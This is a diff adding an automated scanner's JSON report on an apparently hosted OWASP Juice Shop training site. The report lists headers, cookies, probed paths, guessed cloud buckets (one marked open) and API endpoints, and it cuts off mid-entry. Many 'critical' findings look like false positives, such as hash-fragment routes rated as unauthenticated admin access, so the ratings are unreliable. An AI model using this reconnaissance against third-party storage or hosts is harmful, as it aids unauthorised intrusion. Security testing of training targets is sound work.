@@ -1,0 +1,1301 @@
+{
+  "name": "20260520_144251",
+  "target": "https://juiceshop.akto.io/#/",
+  "domain": "juiceshop.akto.io",
+  "threads": 50,
+  "timeout": 20,
+  "findings": [
+    {
+      "port": 443,
+      "state": "open",
+      "service": "HTTPS",
+      "banner": "HTTP/1.1 400 Bad Request\r",
+      "risk": "low"
+    },
+    {
+      "module": "Technology Fingerprinting",
+      "severity": "info",
+      "data": {
+        "url": "https://juiceshop.akto.io/#/",
+        "status_code": 200,
+        "server": [
+          "Not disclosed"
+        ],
+        "cms_frameworks": [
+          "None detected"
+        ],
+        "javascript_libs": [
+          "None detected"
+        ],
+        "security_headers": {
+          "X-Frame-Options": "\u2705 SAMEORIGIN",
+          "X-Content-Type-Options": "\u2705 nosniff",
+          "Strict-Transport-Security": "\u274c MISSING \u2014 Protects against MITM / protocol downgrade",
+          "Content-Security-Policy": "\u274c MISSING \u2014 Mitigates XSS & data injection",
+          "X-XSS-Protection": "\u274c MISSING \u2014 Old-browser XSS filter",
+          "Referrer-Policy": "\u274c MISSING \u2014 Controls referrer leakage",
+          "Permissions-Policy": "\u274c MISSING \u2014 Restricts browser feature access"
+        },
+        "cookie_issues": [
+          "Cookie missing HttpOnly flag"
+        ],
+        "raw_headers": {
+          "Date": "Wed, 20 May 2026 10:49:15 GMT",
+          "Content-Type": "text/html; charset=UTF-8",
+          "Transfer-Encoding": "chunked",
+          "Connection": "keep-alive",
+          "Access-Control-Allow-Origin": "*",
+          "X-Content-Type-Options": "nosniff",
+          "X-Frame-Options": "SAMEORIGIN",
+          "Feature-Policy": "payment 'self'",
+          "X-Recruiting": "/#/jobs",
+          "Accept-Ranges": "bytes",
+          "Cache-Control": "public, max-age=0",
+          "Last-Modified": "Tue, 19 May 2026 07:18:34 GMT",
+          "ETag": "W/\"124fa-19e3f19c5ae\"",
+          "Vary": "Accept-Encoding",
+          "Content-Encoding": "br"
+        }
+      }
+    },
+    {
+      "module": "Web Crawler",
+      "severity": "info",
+      "data": {
+        "pages": [
+          "https://juiceshop.akto.io/#"
+        ],
+        "forms": [],
+        "endpoints": [],
+        "secrets": [],
+        "js_endpoints": [],
+        "js_graphql": []
+      }
+    },
+    {
+      "type": "AWS S3",
+      "url": "http://juiceshop.s3.amazonaws.com",
+      "status": "Exists (Access Denied)",
+      "severity": "info"
+    },
+    {
+      "type": "AWS S3",
+      "url": "http://juiceshop-staging.s3.amazonaws.com",
+      "status": "Exists (Access Denied)",
+      "severity": "info"
+    },
+    {
+      "type": "Azure Blob",
+      "url": "https://juiceshop.blob.core.windows.net/",
+      "status": "Exists",
+      "severity": "info"
+    },
+    {
+      "type": "GCP Bucket",
+      "url": "https://storage.googleapis.com/juiceshoptest",
+      "status": "Exists (Access Denied)",
+      "severity": "info"
+    },
+    {
+      "type": "GCP Bucket",
+      "url": "https://storage.googleapis.com/juiceshop-backup",
+      "status": "Open",
+      "severity": "high"
+    },
+    {
+      "type": "Infrastructure",
+      "severity": "info",
+      "evidence": "ASN: AS8075",
+      "detail": "Company: 13.64.0.0/11"
+    },
+    {
+      "type": "IP Prefixes",
+      "severity": "info",
+      "evidence": "Found 1099 CIDR blocks",
+      "detail": "208.66.231.0/24, 51.140.0.0/14, 128.24.0.0/16, 199.65.40.0/24, 137.117.0.0/16, 135.130.0.0/16, 204.194.56.0/22, 2001:df0:d8::/48, 134.170.0.0/16, 135.88.0.0/16..."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api-docs/",
+      "path": "api-docs/",
+      "status_code": 200,
+      "size": 3106,
+      "severity": "medium",
+      "detail": "Path accessible with HTTP 200",
+      "evidence": "HTTP 200 | Size: 3106 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 5.3,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/security.txt",
+      "path": "security.txt",
+      "status_code": 200,
+      "size": 475,
+      "severity": "medium",
+      "detail": "Path accessible with HTTP 200",
+      "evidence": "HTTP 200 | Size: 475 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 5.3,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/robots.txt",
+      "path": "robots.txt",
+      "status_code": 200,
+      "size": 28,
+      "severity": "medium",
+      "detail": "Path accessible with HTTP 200",
+      "evidence": "HTTP 200 | Size: 28 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 5.3,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/metrics",
+      "path": "metrics",
+      "status_code": 200,
+      "size": 25506,
+      "severity": "medium",
+      "detail": "Path accessible with HTTP 200",
+      "evidence": "HTTP 200 | Size: 25506 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 5.3,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/.well-known",
+      "path": ".well-known",
+      "status_code": 200,
+      "size": 8903,
+      "severity": "medium",
+      "detail": "Path accessible with HTTP 200",
+      "evidence": "HTTP 200 | Size: 8903 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 5.3,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api-docs",
+      "path": "api-docs",
+      "status_code": 301,
+      "size": 158,
+      "severity": "info",
+      "detail": "Path accessible with HTTP 301",
+      "evidence": "HTTP 301 | Size: 158 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/media",
+      "path": "media",
+      "status_code": 301,
+      "size": 155,
+      "severity": "info",
+      "detail": "Path accessible with HTTP 301",
+      "evidence": "HTTP 301 | Size: 155 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/assets",
+      "path": "assets",
+      "status_code": 301,
+      "size": 156,
+      "severity": "info",
+      "detail": "Path accessible with HTTP 301",
+      "evidence": "HTTP 301 | Size: 156 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/rest",
+      "path": "rest",
+      "status_code": 500,
+      "size": 3013,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3013 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api",
+      "path": "api",
+      "status_code": 500,
+      "size": 3011,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3011 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/profile",
+      "path": "profile",
+      "status_code": 500,
+      "size": 1041,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 1041 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api/v2/",
+      "path": "api/v2/",
+      "status_code": 500,
+      "size": 3019,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3019 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api/v3",
+      "path": "api/v3",
+      "status_code": 500,
+      "size": 3017,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3017 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api/",
+      "path": "api/",
+      "status_code": 500,
+      "size": 3013,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3013 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api/v1/",
+      "path": "api/v1/",
+      "status_code": 500,
+      "size": 3019,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3019 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api/v1",
+      "path": "api/v1",
+      "status_code": 500,
+      "size": 3017,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3017 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/api/v2",
+      "path": "api/v2",
+      "status_code": 500,
+      "size": 3017,
+      "severity": "info",
+      "detail": "Server error triggered \u2014 possible misconfiguration",
+      "evidence": "HTTP 500 | Size: 3017 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 0.0,
+      "remediation": "Review if this path should be publicly accessible. Add authentication if needed."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/admin",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /admin",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/admin",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/admin/",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /admin/",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/admin/",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/administrator",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /administrator",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/administrator",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/administrator/",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /administrator/",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/administrator/",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/wp-admin",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /wp-admin",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/wp-admin",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/wp-admin/",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /wp-admin/",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/wp-admin/",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/dashboard",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /dashboard",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/dashboard",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/control",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /control",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/control",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/manager",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /manager",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/manager",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/management",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /management",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/management",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/backend",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /backend",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/backend",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/cpanel",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /cpanel",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/cpanel",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/login",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /login",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/login",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/signin",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /signin",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/signin",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/auth",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /auth",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/auth",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/secure",
+      "type": "Unauthenticated Admin Access",
+      "severity": "critical",
+      "detail": "Admin path accessible without authentication: /secure",
+      "evidence": "HTTP 200 on https://juiceshop.akto.io/#/secure",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.1,
+      "remediation": "Restrict admin paths to authenticated and authorized users only."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "CORS Wildcard Origin",
+      "severity": "medium",
+      "detail": "Server returns Access-Control-Allow-Origin: * \u2014 any origin can read responses.",
+      "evidence": "ACAO: *",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 5.3,
+      "remediation": "Restrict ACAO to a specific trusted origin. Never use wildcard when credentials are involved."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Missing Header: Content-Security-Policy",
+      "severity": "high",
+      "detail": "CSP prevents XSS and data injection attacks by controlling allowed resource sources.",
+      "evidence": "Header 'Content-Security-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add a strict CSP: 'default-src \\'self\\'; script-src \\'self\\'; object-src \\'none\\';'"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Missing Header: Strict-Transport-Security",
+      "severity": "high",
+      "detail": "HSTS forces HTTPS connections and prevents SSL-stripping attacks.",
+      "evidence": "Header 'Strict-Transport-Security' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Missing Header: Referrer-Policy",
+      "severity": "low",
+      "detail": "Missing Referrer-Policy may leak sensitive URL information to third parties.",
+      "evidence": "Header 'Referrer-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: Referrer-Policy: strict-origin-when-cross-origin"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Missing Header: Permissions-Policy",
+      "severity": "info",
+      "detail": "Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).",
+      "evidence": "Header 'Permissions-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Missing Header: Cross-Origin-Opener-Policy",
+      "severity": "info",
+      "detail": "Missing COOP allows cross-origin pages to access window references.",
+      "evidence": "Header 'Cross-Origin-Opener-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Opener-Policy: same-origin"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Missing Header: Cross-Origin-Resource-Policy",
+      "severity": "info",
+      "detail": "Missing CORP allows cross-origin pages to load this site's resources.",
+      "evidence": "Header 'Cross-Origin-Resource-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Resource-Policy: same-origin"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "location": "Cookie: ApplicationGatewayAffinityCORS",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "type": "Cookie Missing HttpOnly: ApplicationGatewayAffinityCORS",
+      "severity": "medium",
+      "detail": "Cookie 'ApplicationGatewayAffinityCORS' lacks HttpOnly flag \u2014 readable by JavaScript, enabling XSS-based session theft.",
+      "evidence": "Set-Cookie: ApplicationGatewayAffinityCORS=... (no HttpOnly)",
+      "cvss": 5.4,
+      "remediation": "Set HttpOnly attribute: Set-Cookie: ApplicationGatewayAffinityCORS=...; HttpOnly"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "location": "Cookie: ApplicationGatewayAffinityCORS",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "type": "Sensitive Data in Cookie: ApplicationGatewayAffinityCORS",
+      "severity": "low",
+      "detail": "Possible base64-encoded data detected in cookie 'ApplicationGatewayAffinityCORS' value.",
+      "evidence": "ApplicationGatewayAffinityCORS=6c9ff38cd4c599764ea1796096cc2732",
+      "cvss": 3.1,
+      "remediation": "Never store sensitive data directly in cookie values. Use server-side sessions."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "location": "Cookie: ApplicationGatewayAffinity",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "type": "Cookie Missing HttpOnly: ApplicationGatewayAffinity",
+      "severity": "medium",
+      "detail": "Cookie 'ApplicationGatewayAffinity' lacks HttpOnly flag \u2014 readable by JavaScript, enabling XSS-based session theft.",
+      "evidence": "Set-Cookie: ApplicationGatewayAffinity=... (no HttpOnly)",
+      "cvss": 5.4,
+      "remediation": "Set HttpOnly attribute: Set-Cookie: ApplicationGatewayAffinity=...; HttpOnly"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "location": "Cookie: ApplicationGatewayAffinity",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "type": "Cookie Missing Secure Flag: ApplicationGatewayAffinity",
+      "severity": "medium",
+      "detail": "Cookie 'ApplicationGatewayAffinity' lacks Secure flag \u2014 transmitted over HTTP, vulnerable to interception.",
+      "evidence": "Set-Cookie: ApplicationGatewayAffinity=... (no Secure)",
+      "cvss": 5.4,
+      "remediation": "Set Secure attribute: Set-Cookie: ApplicationGatewayAffinity=...; Secure"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "location": "Cookie: ApplicationGatewayAffinity",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "type": "Cookie Missing SameSite: ApplicationGatewayAffinity",
+      "severity": "medium",
+      "detail": "Cookie 'ApplicationGatewayAffinity' has no SameSite attribute \u2014 CSRF attacks may succeed.",
+      "evidence": "Set-Cookie: ApplicationGatewayAffinity=... (no SameSite)",
+      "cvss": 4.3,
+      "remediation": "Add SameSite=Lax or SameSite=Strict: Set-Cookie: ApplicationGatewayAffinity=...; SameSite=Strict"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "location": "Cookie: ApplicationGatewayAffinity",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "type": "Sensitive Data in Cookie: ApplicationGatewayAffinity",
+      "severity": "low",
+      "detail": "Possible base64-encoded data detected in cookie 'ApplicationGatewayAffinity' value.",
+      "evidence": "ApplicationGatewayAffinity=6c9ff38cd4c599764ea1796096cc2732",
+      "cvss": 3.1,
+      "remediation": "Never store sensitive data directly in cookie values. Use server-side sessions."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/admin",
+      "type": "Admin Dashboard \u2014 No Authentication Required",
+      "severity": "critical",
+      "detail": "Admin dashboard at https://juiceshop.akto.io/#/admin is directly accessible without login",
+      "evidence": "HTTP 200 | Dashboard indicators present without authentication",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.8,
+      "remediation": "Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/administrator",
+      "type": "Admin Dashboard \u2014 No Authentication Required",
+      "severity": "critical",
+      "detail": "Admin dashboard at https://juiceshop.akto.io/#/administrator is directly accessible without login",
+      "evidence": "HTTP 200 | Dashboard indicators present without authentication",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.8,
+      "remediation": "Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/dashboard",
+      "type": "Admin Dashboard \u2014 No Authentication Required",
+      "severity": "critical",
+      "detail": "Admin dashboard at https://juiceshop.akto.io/#/dashboard is directly accessible without login",
+      "evidence": "HTTP 200 | Dashboard indicators present without authentication",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.8,
+      "remediation": "Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/wp-admin",
+      "type": "Admin Dashboard \u2014 No Authentication Required",
+      "severity": "critical",
+      "detail": "Admin dashboard at https://juiceshop.akto.io/#/wp-admin is directly accessible without login",
+      "evidence": "HTTP 200 | Dashboard indicators present without authentication",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.8,
+      "remediation": "Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/manager",
+      "type": "Admin Dashboard \u2014 No Authentication Required",
+      "severity": "critical",
+      "detail": "Admin dashboard at https://juiceshop.akto.io/#/manager is directly accessible without login",
+      "evidence": "HTTP 200 | Dashboard indicators present without authentication",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.8,
+      "remediation": "Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/cpanel",
+      "type": "Admin Dashboard \u2014 No Authentication Required",
+      "severity": "critical",
+      "detail": "Admin dashboard at https://juiceshop.akto.io/#/cpanel is directly accessible without login",
+      "evidence": "HTTP 200 | Dashboard indicators present without authentication",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 9.8,
+      "remediation": "Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/",
+      "type": "DOM XSS Sink \u2014 setTimeout",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Dangerous sink 'setTimeout' received user-controllable data.",
+      "evidence": "Value: function(){return T(this,arguments)}",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Never pass unsanitized input to setTimeout."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/",
+      "type": "DOM XSS Sink \u2014 setInterval",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Dangerous sink 'setInterval' received user-controllable data.",
+      "evidence": "Value: function(){return T(this,arguments)}",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Never pass unsanitized input to setInterval."
+    },
+    {
+      "url": "https://juiceshop.akto.io/main.js",
+      "type": "Secret Leakage in JS \u2014 Password",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "Password found in JavaScript file.",
+      "evidence": "password:\"password\"...",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "remediation": "Remove secrets from client-side JS. Use server-side environment variables."
+    },
+    {
+      "url": "https://juiceshop.akto.io/",
+      "type": "DOM XSS Sink \u2014 setTimeout",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Dangerous sink 'setTimeout' received user-controllable data.",
+      "evidence": "Value: function(){return T(this,arguments)}",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Never pass unsanitized input to setTimeout."
+    },
+    {
+      "url": "https://juiceshop.akto.io/",
+      "type": "DOM XSS Sink \u2014 setInterval",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Dangerous sink 'setInterval' received user-controllable data.",
+      "evidence": "Value: function(){return T(this,arguments)}",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Never pass unsanitized input to setInterval."
+    },
+    {
+      "url": "https://juiceshop.akto.io/main.js",
+      "type": "Secret Leakage in JS \u2014 Password",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "Password found in JavaScript file.",
+      "evidence": "password:\"password\"...",
+      "owasp": "A02:2021 \u2013 Cryptographic Failures",
+      "remediation": "Remove secrets from client-side JS. Use server-side environment variables."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Recon \u2014 Discovered API Endpoints in JS",
+      "severity": "info",
+      "cvss": 0.0,
+      "detail": "Found 20 API endpoints via JS analysis.",
+      "evidence": "/api/Cards\n/api/Hints\n./redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW\n/api/SecurityAnswers\n/api/Users\n/api/Deliverys\n/api/Addresss\n/api/Complaints\n//ipinfo.io\n/api/Quantitys\n/api/SecurityQuestions\n//js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js\n./redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm\n/api/Challenges\n/api/Feedbacks\n/api/Products\n//api.ipinfodb.com/v3/ip-country/?key={api_key}&format=json&callback={callback}\n/api/BasketItems\n/api/Recycles\n./redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "remediation": "Ensure all discovered endpoints require authentication."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "Recon \u2014 Observed API Calls (XHR/fetch)",
+      "severity": "info",
+      "cvss": 0.0,
+      "detail": "Observed 27 XHR/fetch calls during crawl.",
